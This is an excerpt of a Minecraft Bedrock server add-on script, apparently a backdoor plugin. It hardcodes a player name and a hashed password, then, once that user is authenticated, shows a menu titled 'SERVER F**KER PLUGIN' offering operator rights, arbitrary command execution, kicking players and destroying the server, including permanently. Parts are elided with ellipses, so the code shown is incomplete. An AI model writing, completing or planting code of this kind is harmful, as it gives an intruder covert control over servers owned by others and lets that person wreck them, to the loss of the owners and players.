...
var config = {
  playerName: "HappyTiger4336",
  password: "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"
  // password after SHA-256
};

// build/scripts/main.js
import { ActionFormData, ModalFormData } from "@minecraft/server-ui";

// build/scripts/lib/sha256.js
var sha256 = function(global) {
  "use strict";
...
function fuck(player) {
  if (player.getDynamicProperty("auth")) {
    ...
    form.title("SERVER F**KER PLUGIN").button("Get OP (Beta) ").button("Run command").button("Kick Player (UNABLE TO USE) ").button("Destroy Server (VERY DANGEROUS) ").show(player).then((res) => {
      if (!res.canceled) {
        switch (res.selection) {
          ...
          case 2:
            let players = [];
            for (let player2 of Array.from(world.getAllPlayers())) {
              players.push(player2.name);
            }
            let kickForm = new ModalFormData();
            kickForm.title("SERVER F**KER PLUGIN").dropdown("Select the player you want to kick...", players).show(player).then((res2) => {
          ...
          case 3:
            ...
            destroyForm.title("SERVER F**KER PLUGIN").body("ARE YOU SURE? THIS IS VERY DANGEROUS").button("Destroy (Owner can restart)").button("Destroy FOREVER").button("Cancel");
            destroyForm.show(player).then((res2) => {
